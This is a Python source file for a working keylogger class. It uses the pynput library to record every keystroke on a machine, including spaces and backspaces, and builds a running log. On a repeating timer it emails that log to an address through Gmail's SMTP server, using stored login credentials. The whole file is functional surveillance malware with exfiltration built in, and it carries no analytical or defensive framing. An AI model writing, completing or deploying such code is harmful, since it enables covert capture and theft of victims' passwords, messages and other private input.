#!/usr/bin/env python
import pynput.keyboard
import threading, smtplib


class Keylogger:
    def __init__(self, timer, email, password):
        self.log = "Keylogger started:"
        self.timer = timer
        self.email = email
        self.password = password

    def append_string(self, string):
        self.log = self.log + string


    def process_key_press(self,key):
        try:
            current_key = str(key.char)
            self.append_string(current_key)
        except AttributeError:
            if key == key.space:
                current_key = " "
                self.append_string(current_key)
            elif key == key.backspace:
                self.log = self.log[:-1]
            else:
                current_key =  " " + str(key) + " "
                self.append_string(current_key)

    def sendmail(self,email, password, msg):
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, msg)
        server.quit()

    def report(self):
        self.sendmail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.timer, self.report)
        timer.start()


    def start(self):
        keyboard_listener = pynput.keyboard.Listener(on_press= self.process_key_press)
        with keyboard_listener:
            self.report()
            keyboard_listener.join()
